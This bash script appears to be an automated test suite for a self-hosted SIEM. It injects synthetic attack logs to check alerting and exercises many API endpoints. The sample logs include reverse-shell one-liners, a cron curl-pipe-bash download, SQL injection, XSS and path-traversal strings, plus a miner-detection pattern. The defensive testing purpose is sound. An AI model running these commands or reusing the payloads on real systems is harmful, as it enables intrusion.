#!/bin/bash
# ============================================================
#  SecureWatch SIEM — Full Test Suite v2
#  Hamma feature larni testlaydi, xatoliklarni ko'rsatadi
# ============================================================

BASE="${SIEM_URL:-http://localhost:8000}"
ADMIN_PASS="${ADMIN_PASS:-Admin@SIEM2024!}"
GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

PASS=0; FAIL=0; WARN=0

ok()   { echo -e "  ${GREEN}✓${NC} $1"; ((PASS++)); }
fail() { echo -e "  ${RED}✗${NC} $1"; ((FAIL++)); }
warn() { echo -e "  ${YELLOW}!${NC} $1"; ((WARN++)); }
section() { echo -e "\n${CYAN}${BOLD}══ $1 ══${NC}"; }

# ── JSON helper ──────────────────────────────────────────────────────────────
jq_val() { echo "$1" | python3 -c "import sys,json; d=json.load(sys.stdin); print($2)" 2>/dev/null; }

# ── HTTP helpers ─────────────────────────────────────────────────────────────
get()  { curl -sf -H "Authorization: Bearer $TOKEN" "$BASE$1" 2>/dev/null; }
post() { curl -sf -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d "$2" "$BASE$1" 2>/dev/null; }
put()  { curl -sf -X PUT  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d "$2" "$BASE$1" 2>/dev/null; }
del()  { curl -sf -X DELETE -H "Authorization: Bearer $TOKEN" "$BASE$1" 2>/dev/null; }

check_http() {
  local label="$1" url="$2" expected_field="$3"
  local r=$(get "$url")
  if [ -n "$r" ] && [ "$r" != "null" ]; then
    ok "$label"
  else
    fail "$label — empty response"
  fi
}

echo -e "${CYAN}${BOLD}"
echo "╔══════════════════════════════════════════════════╗"
echo "║     SecureWatch SIEM — Full Test Suite v2        ║"
echo "║     $(date '+%Y-%m-%d %H:%M:%S')                        ║"
echo "╚══════════════════════════════════════════════════╝${NC}"

# ── 1. Health Check ──────────────────────────────────────────────────────────
section "1. System Health"
HEALTH=$(curl -sf "$BASE/api/health" 2>/dev/null)
if [ -n "$HEALTH" ]; then
  STATUS=$(jq_val "$HEALTH" "d['status']")
  DB=$(jq_val "$HEALTH" "d['checks']['database']")
  ES=$(jq_val "$HEALTH" "d['checks']['elasticsearch']")
  REDIS=$(jq_val "$HEALTH" "d['checks']['redis']")
  [ "$STATUS" = "ok" ] && ok "Overall health: OK" || warn "Overall health: $STATUS"
  [ "$DB" = "ok" ]     && ok "PostgreSQL: OK"     || fail "PostgreSQL: $DB"
  [ "$ES" != "None" ] && [[ "$ES" == *"ok"* || "$ES" == "green" || "$ES" == "yellow" ]] && ok "Elasticsearch: $ES" || warn "Elasticsearch: ${ES:-unreachable}"
  [ "$REDIS" = "ok" ]  && ok "Redis: OK"           || warn "Redis: ${REDIS:-unreachable}"
else
  fail "Health endpoint unreachable — docker compose ps qilib tekshiring"
  exit 1
fi

# ── 2. Authentication ────────────────────────────────────────────────────────
section "2. Authentication"
LOGIN=$(curl -sf -X POST "$BASE/api/auth/login" -d "username=admin&password=$ADMIN_PASS" 2>/dev/null)
TOKEN=$(jq_val "$LOGIN" "d.get('access_token','')")
if [ -n "$TOKEN" ] && [ "$TOKEN" != "None" ] && [ ${#TOKEN} -gt 10 ]; then
  ok "Admin login (JWT token received)"
else
  fail "Admin login FAILED — parolni tekshiring: $ADMIN_PASS"
  echo -e "  ${YELLOW}Hint: ADMIN_PASS=<yourpass> bash test_siem.sh${NC}"
  exit 1
fi

ME=$(get "/api/auth/me")
ME_USER=$(jq_val "$ME" "d.get('username','')")
[ "$ME_USER" = "admin" ] && ok "GET /api/auth/me → username=admin" || fail "GET /api/auth/me failed: $ME"

# Wrong password test
BAD=$(curl -sf -X POST "$BASE/api/auth/login" -d "username=admin&password=wrongpass123" 2>/dev/null)
BAD_TOKEN=$(jq_val "$BAD" "d.get('access_token','')")
[ -z "$BAD_TOKEN" ] || [ "$BAD_TOKEN" = "None" ] && ok "Wrong password correctly rejected" || warn "Wrong password accepted (security issue!)"

# ── 3. Agent Registration ────────────────────────────────────────────────────
section "3. Agent Registration & Heartbeat"
AGENT_R=$(post "/api/agents/register" '{
  "hostname":"test-siem-lab",
  "ip_address":"10.0.99.1",
  "os":"Linux",
  "os_version":"Ubuntu 22.04",
  "agent_version":"2.0.0"
}')
AGENT_ID=$(jq_val "$AGENT_R" "d.get('agent_id','')")
if [ -n "$AGENT_ID" ] && [ "$AGENT_ID" != "None" ]; then
  ok "Agent registered: $AGENT_ID"
else
  fail "Agent registration failed: $AGENT_R"
  AGENT_ID="unknown"
fi

AGENTS=$(get "/api/agents")
AGENT_CNT=$(jq_val "$AGENTS" "len(d)")
[ "$AGENT_CNT" -gt 0 ] 2>/dev/null && ok "GET /api/agents → $AGENT_CNT agents" || warn "No agents in list"

HB=$(curl -sf -X POST "$BASE/api/agents/$AGENT_ID/heartbeat" \
  -H "Content-Type: application/json" \
  -d '{"agent_cpu_pct":12.5,"agent_mem_mb":128}' 2>/dev/null)
[ -n "$HB" ] && ok "Heartbeat OK" || warn "Heartbeat failed (agent may not be registered yet)"

# ── 4. Log Ingestion & Alert Generation ─────────────────────────────────────
section "4. Log Ingestion & Alert Engine"

send_logs() {
  local label="$1" logs="$2"
  local r=$(curl -sf -X POST "$BASE/api/logs/ingest" \
    -H "Content-Type: application/json" \
    -d "{\"agent_id\":\"$AGENT_ID\",\"logs\":$logs}" 2>/dev/null)
  local ingested=$(jq_val "$r" "d.get('ingested',0)")
  [ -n "$r" ] && ok "$label (ingested=${ingested:-?})" || fail "$label"
}

send_logs "SSH Brute Force (7 attempts)" '[
  {"message":"Failed password for root from 185.220.101.1 port 54321 ssh2","source":"sshd","level":"ERROR"},
  {"message":"Failed password for root from 185.220.101.1 port 54322 ssh2","source":"sshd","level":"ERROR"},
  {"message":"Failed password for admin from 185.220.101.1 port 54323 ssh2","source":"sshd","level":"ERROR"},
  {"message":"Failed password for ubuntu from 185.220.101.1 port 54324 ssh2","source":"sshd","level":"ERROR"},
  {"message":"Failed password for user from 185.220.101.1 port 54325 ssh2","source":"sshd","level":"ERROR"},
  {"message":"Failed password for pi from 185.220.101.1 port 54326 ssh2","source":"sshd","level":"ERROR"},
  {"message":"Failed password for test from 185.220.101.1 port 54327 ssh2","source":"sshd","level":"ERROR"}
]'

send_logs "Root login success (HIGH alert)" '[
  {"message":"Accepted password for root from 185.220.101.1 port 54328 ssh2","source":"sshd","level":"WARNING"}
]'

send_logs "SSH Invalid user scan" '[
  {"message":"Invalid user admin123 from 89.248.167.131 port 41234","source":"sshd"},
  {"message":"Invalid user oracle from 89.248.167.131 port 41235","source":"sshd"},
  {"message":"Invalid user ftpuser from 89.248.167.131 port 41236","source":"sshd"}
]'

send_logs "Sudo privilege escalation" '[
  {"message":"sudo: john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/bin/bash","source":"sudo"},
  {"message":"sudo: john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/passwd root","source":"sudo"}
]'

send_logs "FIM — /etc/passwd modified (CRITICAL)" '[
  {"message":"FIM ALERT: File MODIFIED: /etc/passwd | old=abc123 new=def456","source":"fim","level":"CRITICAL"},
  {"message":"FIM ALERT: File MODIFIED: /etc/shadow | old=111aaa new=222bbb","source":"fim","level":"CRITICAL"}
]'

send_logs "Rootkit indicators (CRITICAL)" '[
  {"message":"ROOTCHECK [ROOTKIT_FILE]: Known rootkit file found: /usr/bin/.sshd","source":"rootcheck","level":"CRITICAL"},
  {"message":"ROOTCHECK [LD_PRELOAD]: /etc/ld.so.preload contains: /usr/lib/libprocesshider.so","source":"rootcheck","level":"CRITICAL"}
]'

send_logs "Reverse shell attempt" '[
  {"message":"SUSPICIOUS process: [4521] bash cmd=bash -i >& /dev/tcp/185.220.101.1/4444 0>&1","source":"process_monitor","level":"CRITICAL"},
  {"message":"SUSPICIOUS process: [4522] nc cmd=nc -e /bin/bash 185.220.101.1 4444","source":"process_monitor","level":"CRITICAL"}
]'

send_logs "SQL injection + XSS + path traversal" '[
  {"message":"192.168.1.100 - - [GET /login?id=1 UNION SELECT username,password FROM users-- HTTP/1.1] 200","source":"nginx"},
  {"message":"192.168.1.100 - - [GET /search?q=<script>alert(1)</script> HTTP/1.1] 400","source":"nginx"},
  {"message":"192.168.1.100 - - [GET /../../../../etc/passwd HTTP/1.1] 403","source":"nginx"}
]'

send_logs "Port scan (UFW blocks)" '[
  {"message":"[UFW BLOCK] IN=eth0 SRC=94.102.49.190 DST=10.0.0.1 PROTO=TCP DPT=22","source":"kernel"},
  {"message":"[UFW BLOCK] IN=eth0 SRC=94.102.49.190 DST=10.0.0.1 PROTO=TCP DPT=3306","source":"kernel"},
  {"message":"[UFW BLOCK] IN=eth0 SRC=94.102.49.190 DST=10.0.0.1 PROTO=TCP DPT=5432","source":"kernel"},
  {"message":"[UFW BLOCK] IN=eth0 SRC=94.102.49.190 DST=10.0.0.1 PROTO=TCP DPT=6379","source":"kernel"},
  {"message":"[UFW BLOCK] IN=eth0 SRC=94.102.49.190 DST=10.0.0.1 PROTO=TCP DPT=9200","source":"kernel"},
  {"message":"[UFW BLOCK] IN=eth0 SRC=94.102.49.190 DST=10.0.0.1 PROTO=TCP DPT=27017","source":"kernel"}
]'

send_logs "OOM Killer + Service crash" '[
  {"message":"Out of memory: Kill process 12345 (java) score 987 or sacrifice child","source":"kernel","level":"CRITICAL"},
  {"message":"nginx[3421]: segfault at 0 ip 00007f3c sp 00007fff error 4","source":"kernel","level":"ERROR"},
  {"message":"systemd[1]: nginx.service: Main process exited, code=killed, status=11/SEGV","source":"systemd"}
]'

send_logs "New user created (persistence)" '[
  {"message":"useradd: new user: name=backdoor, UID=1337, GID=1337, home=/home/backdoor, shell=/bin/bash","source":"useradd","level":"WARNING"},
  {"message":"chage: changed password expiry for backdoor","source":"chage"}
]'

send_logs "Crontab modification" '[
  {"message":"CRON[1234]: (root) CMD (curl -s http://185.220.101.1/payload.sh | bash)","source":"cron","level":"CRITICAL"},
  {"message":"crontab: installing new crontab for root","source":"crontab"}
]'

send_logs "System metrics (high load)" '[
  {"message":"CPU=94%(4cores) | MEM=87%(6.9GB/8.0GB) | SWAP=52% | DISK=78% | NET=up234MB/down1024MB | PROCS=341 | ALERTS=CPU critical: 94%|Memory high: 87%","source":"system_metrics","level":"CRITICAL","parsed_fields":{"event_type":"system_metrics","cpu_percent":94,"memory_percent":87,"disk_percent":78}}
]'

send_logs "DNS suspicious queries (C2 beacon)" '[
  {"message":"DNS query: evil-c2-server.ru type A from 10.0.0.50","source":"dns_monitor","level":"WARNING"},
  {"message":"DNS query: malware-cdn.xyz type A from 10.0.0.50","source":"dns_monitor","level":"WARNING"},
  {"message":"DNS NXDOMAIN flood: 50 failed lookups from 10.0.0.50 in 30s","source":"dns_monitor","level":"CRITICAL"}
]'

sleep 2

# ── 5. Alerts ────────────────────────────────────────────────────────────────
section "5. Alerts API"
ALERTS=$(get "/api/alerts?size=100")
ALERT_TOTAL=$(jq_val "$ALERTS" "d.get('total',0)")
ALERT_LIST=$(jq_val "$ALERTS" "len(d.get('alerts',[]))")
[ "$ALERT_TOTAL" -gt 0 ] 2>/dev/null && ok "Alerts generated: total=$ALERT_TOTAL" || warn "No alerts generated — rule engine checked?"

# Stats
ASTATS=$(get "/api/alerts/stats/summary?days=1")
[ -n "$ASTATS" ] && ok "Alert stats OK" || warn "Alert stats endpoint failed"

# Get first alert ID for further tests
FIRST_ALERT=$(jq_val "$ALERTS" "d.get('alerts',[])[0].get('id') if d.get('alerts',[]) else None")
if [ -n "$FIRST_ALERT" ] && [ "$FIRST_ALERT" != "None" ]; then
  ok "First alert ID: $FIRST_ALERT"

  # Update status
  UPD=$(put "/api/alerts/$FIRST_ALERT/status" '{"status":"investigating","note":"Auto-test investigation"}')
  [ -n "$UPD" ] && ok "Alert status → investigating" || warn "Alert status update failed"

  # Add note
  NOTE=$(post "/api/alerts/$FIRST_ALERT/notes" '{"body":"Test note from automated test suite"}')
  [ -n "$NOTE" ] && ok "Alert note added" || warn "Alert note add failed"
else
  warn "No alerts to test status/note on"
fi

# ── 6. Dashboard ─────────────────────────────────────────────────────────────
section "6. Dashboard API"
DASH=$(get "/api/dashboard/stats")
[ -n "$DASH" ] && ok "GET /api/dashboard/stats OK" || fail "Dashboard stats failed"
if [ -n "$DASH" ]; then
  ONLINE=$(jq_val "$DASH" "d.get('online_agents',0)")
  LOGS=$(jq_val "$DASH" "d.get('total_logs_today',0)")
  ok "  Agents online=$ONLINE, Logs today=$LOGS"
fi

# ── 7. Rules ─────────────────────────────────────────────────────────────────
section "7. Rules CRUD + Test"
RULES=$(get "/api/rules")
RULE_CNT=$(jq_val "$RULES" "len(d)")
[ "$RULE_CNT" -gt 0 ] 2>/dev/null && ok "GET /api/rules → $RULE_CNT rules" || warn "No rules found"

# Create new rule
NEW_RULE=$(post "/api/rules" '{
  "name":"[TEST] Crypto miner detection",
  "description":"Detects known crypto mining processes",
  "pattern":"xmrig|minerd|cpuminer|cgminer|bfgminer",
  "severity":"HIGH",
  "category":"malware",
  "enabled":true,
  "cooldown_seconds":300
}')
NEW_RULE_ID=$(jq_val "$NEW_RULE" "d.get('id')")
if [ -n "$NEW_RULE_ID" ] && [ "$NEW_RULE_ID" != "None" ]; then
  ok "Rule created: id=$NEW_RULE_ID"

  # Test rule
  TEST_R=$(post "/api/rules/$NEW_RULE_ID/test" '{
    "sample_logs":[
      "Process started: /usr/bin/xmrig --pool pool.supportxmr.com:3333",
      "Process started: /bin/bash -c ls -la",
      "Process started: /usr/local/bin/minerd -a sha256d"
    ]
  }')
  MATCHED=$(jq_val "$TEST_R" "d.get('matched',0)")
  TOTAL_T=$(jq_val "$TEST_R" "d.get('total',0)")
  [ "$MATCHED" = "2" ] && ok "Rule test: $MATCHED/$TOTAL_T matched (expected 2/3)" || warn "Rule test: $MATCHED/$TOTAL_T matched"

  # Delete test rule
  del "/api/rules/$NEW_RULE_ID" > /dev/null
  ok "Test rule deleted"
else
  fail "Rule creation failed: $NEW_RULE"
fi

# ── 8. Logs ──────────────────────────────────────────────────────────────────
section "8. Logs API"
LOGS=$(get "/api/logs?size=10")
LOG_TOTAL=$(jq_val "$LOGS" "d.get('total',0)")
[ "$LOG_TOTAL" -gt 0 ] 2>/dev/null && ok "GET /api/logs → total=$LOG_TOTAL" || warn "Logs not indexed in Elasticsearch yet"

LSTATS=$(get "/api/logs/stats?hours=1")
[ -n "$LSTATS" ] && ok "Log stats OK" || warn "Log stats failed"

LTIMELINE=$(get "/api/logs/timeline?hours=24")
[ -n "$LTIMELINE" ] && ok "Log timeline OK" || warn "Log timeline failed"

# ── 9. Users ─────────────────────────────────────────────────────────────────
section "9. Users Management"
USERS=$(get "/api/users")
USER_CNT=$(jq_val "$USERS" "len(d)")
[ "$USER_CNT" -gt 0 ] 2>/dev/null && ok "GET /api/users → $USER_CNT users" || warn "Users list empty/failed"

# Create analyst user
NEW_USER=$(post "/api/users" '{
  "username":"test_analyst_lab",
  "email":"analyst.lab@test.local",
  "password":"Test@Lab2024!",
  "role":"analyst"
}')
NEW_UID=$(jq_val "$NEW_USER" "d.get('id')")
if [ -n "$NEW_UID" ] && [ "$NEW_UID" != "None" ]; then
  ok "User created: test_analyst_lab (id=$NEW_UID)"

  # Login as new user
  NEW_TOKEN=$(curl -sf -X POST "$BASE/api/auth/login" \
    -d "username=test_analyst_lab&password=Test@Lab2024!" 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null)
  [ -n "$NEW_TOKEN" ] && ok "Analyst user login OK" || warn "Analyst user login failed"

  # Delete test user
  del "/api/users/$NEW_UID" > /dev/null
  ok "Test user deleted"
else
  warn "User creation failed (may already exist): $NEW_USER"
fi

# ── 10. Cases ────────────────────────────────────────────────────────────────
section "10. Case Management"
CASES=$(get "/api/cases?size=10")
[ -n "$CASES" ] && ok "GET /api/cases OK" || warn "Cases endpoint failed"

CASE_STATS=$(get "/api/cases/stats")
[ -n "$CASE_STATS" ] && ok "Case stats OK" || warn "Case stats failed"

NEW_CASE=$(post "/api/cases" '{
  "title":"[TEST] Ransomware Incident Response",
  "description":"Automated test case for ransomware investigation",
  "severity":"CRITICAL",
  "tlp":"RED",
  "tags":["ransomware","test","automated"],
  "mitre_tactics":["Impact","Execution"],
  "sla_hours":4
}')
NEW_CASE_ID=$(jq_val "$NEW_CASE" "d.get('id')")
if [ -n "$NEW_CASE_ID" ] && [ "$NEW_CASE_ID" != "None" ]; then
  ok "Case created: id=$NEW_CASE_ID"

  # Add note
  CASE_NOTE=$(post "/api/cases/$NEW_CASE_ID/notes" '{"content":"Initial triage: ransomware indicators found on host01","note_type":"note"}')
  [ -n "$CASE_NOTE" ] && ok "Case note added" || warn "Case note failed"

  # Change status
  CASE_ST=$(post "/api/cases/$NEW_CASE_ID/status" '{"status":"in_progress","note":"Started investigation"}')
  [ -n "$CASE_ST" ] && ok "Case status → in_progress" || warn "Case status change failed"

  # Delete
  del "/api/cases/$NEW_CASE_ID" > /dev/null
  ok "Test case deleted"
else
  fail "Case creation failed: $NEW_CASE"
fi

# ── 11. Threat Intel ─────────────────────────────────────────────────────────
section "11. Threat Intelligence"
TI_STATS=$(get "/api/threat-intel/stats")
[ -n "$TI_STATS" ] && ok "Threat intel stats OK" || warn "Threat intel stats failed"

TI_IOC=$(post "/api/threat-intel/iocs" '{
  "ioc_type":"ip",
  "value":"185.220.101.1",
  "severity":"CRITICAL",
  "confidence":90,
  "description":"Known TOR exit node — brute force source",
  "tags":["tor","brute-force","automated-test"],
  "source":"test-lab"
}')
IOC_ID=$(jq_val "$TI_IOC" "d.get('id')")
if [ -n "$IOC_ID" ] && [ "$IOC_ID" != "None" ]; then
  ok "IOC added: ip=185.220.101.1 (id=$IOC_ID)"

  # Lookup
  LOOKUP=$(post "/api/threat-intel/lookup" '{"ioc_type":"ip","value":"185.220.101.1","enrich":false}')
  [ -n "$LOOKUP" ] && ok "IOC lookup OK" || warn "IOC lookup failed"

  # Scan alerts
  SCAN=$(post "/api/threat-intel/scan-alerts?days=1" '')
  HITS=$(jq_val "$SCAN" "d.get('total_hits',0)")
  [ -n "$SCAN" ] && ok "Alert scan: $HITS IOC hits found" || warn "Alert scan failed"

  # Delete test IOC
  curl -sf -X DELETE -H "Authorization: Bearer $TOKEN" "$BASE/api/threat-intel/iocs/$IOC_ID" > /dev/null
  ok "Test IOC deleted"
else
  warn "IOC creation failed: $TI_IOC"
fi

# ── 12. Active Response ───────────────────────────────────────────────────────
section "12. Active Response"
AR_STATS=$(get "/api/ar/stats")
[ -n "$AR_STATS" ] && ok "AR stats OK" || warn "AR stats failed"

AR_TEMPLATES=$(get "/api/ar/templates")
[ -n "$AR_TEMPLATES" ] && ok "AR templates OK" || warn "AR templates failed"

AR_POLICIES=$(get "/api/ar/policies")
[ -n "$AR_POLICIES" ] && ok "AR policies OK" || warn "AR policies failed"

NEW_AR=$(post "/api/ar/policies" '{
  "name":"[TEST] Block suspicious IP",
  "description":"Auto-block IPs with 5+ brute force attempts",
  "enabled":false,
  "trigger_on":"alert",
  "severity_threshold":"HIGH",
  "action":"block_ip",
  "action_params":{"duration":3600}
}')
AR_ID=$(jq_val "$NEW_AR" "d.get('id')")
if [ -n "$AR_ID" ] && [ "$AR_ID" != "None" ]; then
  ok "AR policy created: id=$AR_ID"
  del "/api/ar/policies/$AR_ID" > /dev/null
  ok "AR policy deleted"
else
  warn "AR policy creation failed: $NEW_AR"
fi

# ── 13. Reports ───────────────────────────────────────────────────────────────
section "13. Reports"
REPORT=$(get "/api/reports/summary?days=7")
[ -n "$REPORT" ] && ok "Report summary OK" || warn "Report summary failed"

# ── 14. Vulnerabilities ───────────────────────────────────────────────────────
section "14. Vulnerabilities"
VULNS=$(get "/api/vulns?size=10")
[ -n "$VULNS" ] && ok "GET /api/vulns OK" || warn "Vulns endpoint failed"
VSUMMARY=$(get "/api/vulns/summary")
[ -n "$VSUMMARY" ] && ok "Vuln summary OK" || warn "Vuln summary failed"

# ── 15. SCA ──────────────────────────────────────────────────────────────────
section "15. SCA (Security Config Audit)"
SCA=$(get "/api/sca?size=10")
[ -n "$SCA" ] && ok "GET /api/sca OK" || warn "SCA endpoint failed"

# ── 16. Inventory ────────────────────────────────────────────────────────────
section "16. Inventory"
INV=$(get "/api/inventory/agents")
[ -n "$INV" ] && ok "GET /api/inventory/agents OK" || warn "Inventory agents failed"

# ── 17. Audit Log ────────────────────────────────────────────────────────────
section "17. Audit Log"
AUDIT=$(get "/api/audit?size=10")
AUDIT_TOTAL=$(jq_val "$AUDIT" "d.get('total',0)")
[ "$AUDIT_TOTAL" -gt 0 ] 2>/dev/null && ok "Audit log: $AUDIT_TOTAL entries" || warn "Audit log empty"

# ── 18. Correlation Rules ────────────────────────────────────────────────────
section "18. Correlation Rules"
CORR=$(get "/api/correlation/rules")
[ -n "$CORR" ] && ok "GET /api/correlation/rules OK" || warn "Correlation rules failed"

# ── 19. WebSocket ────────────────────────────────────────────────────────────
section "19. WebSocket Connectivity"
WS_CHECK=$(curl -sf --max-time 2 -o /dev/null -w "%{http_code}" \
  -H "Upgrade: websocket" -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" \
  "$BASE/ws/live" 2>/dev/null)
[ "$WS_CHECK" = "101" ] || [ "$WS_CHECK" = "200" ] && ok "WebSocket endpoint reachable" || warn "WebSocket: HTTP $WS_CHECK (may need proper WS client)"

# ── 20. Rate Limiting ────────────────────────────────────────────────────────
section "20. Rate Limiting"
RATE_HIT=""
for i in $(seq 1 65); do
  R=$(curl -sf -X POST "$BASE/api/logs/ingest" \
    -H "Content-Type: application/json" \
    -d "{\"agent_id\":\"$AGENT_ID\",\"logs\":[{\"message\":\"rate limit test $i\",\"source\":\"test\"}]}" \
    -w "%{http_code}" -o /dev/null 2>/dev/null)
  if [ "$R" = "429" ]; then
    RATE_HIT="yes"
    break
  fi
done
[ "$RATE_HIT" = "yes" ] && ok "Rate limiter triggered at attempt ~$i (429 Too Many Requests)" || warn "Rate limiter not triggered after 65 requests"

# ── Final Results ────────────────────────────────────────────────────────────
echo ""
echo -e "${CYAN}${BOLD}╔══════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}${BOLD}║              TEST RESULTS                    ║${NC}"
echo -e "${CYAN}${BOLD}╠══════════════════════════════════════════════╣${NC}"
echo -e "${CYAN}${BOLD}║${NC}  ${GREEN}✓ PASSED : $PASS${NC}"
echo -e "${CYAN}${BOLD}║${NC}  ${RED}✗ FAILED : $FAIL${NC}"
echo -e "${CYAN}${BOLD}║${NC}  ${YELLOW}! WARNINGS: $WARN${NC}"
echo -e "${CYAN}${BOLD}╚══════════════════════════════════════════════╝${NC}"

echo ""
sleep 2

# Final alert summary
echo -e "${CYAN}Alert breakdown (last check):${NC}"
get "/api/alerts?size=100" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    alerts = d.get('alerts', [])
    total  = d.get('total', 0)
    by_sev = {}
    for a in alerts:
        s = str(a.get('severity','')).upper().split('.')[-1]
        by_sev[s] = by_sev.get(s, 0) + 1
    print(f'  Total: {total}')
    for s in ['CRITICAL','HIGH','MEDIUM','LOW']:
        if by_sev.get(s,0): print(f'  {s}: {by_sev[s]}')
    print()
    for a in alerts[:10]:
        sev = str(a.get('severity','')).upper().split('.')[-1]
        t   = a.get('mitre_technique','') or ''
        print(f'  [{sev:8}] {a[\"title\"][:50]:50} {t}')
except: pass
" 2>/dev/null

echo ""
echo -e "${BOLD}Links:${NC}"
echo -e "  Dashboard:   ${CYAN}http://localhost:8080${NC}"
echo -e "  Alerts:      ${CYAN}http://localhost:8080/alerts${NC}"
echo -e "  Cases:       ${CYAN}http://localhost:8080/cases${NC}"
echo -e "  Threat Intel:${CYAN}http://localhost:8080/threat-intel${NC}"
echo -e "  Grafana:     ${CYAN}http://localhost:3001${NC}"

if [ "$FAIL" -gt 0 ]; then
  echo ""
  echo -e "${RED}${BOLD}$FAIL test(s) FAILED. Loglarni ko'ring: docker compose logs backend${NC}"
  exit 1
fi
echo -e "\n${GREEN}${BOLD}All tests passed!${NC}"
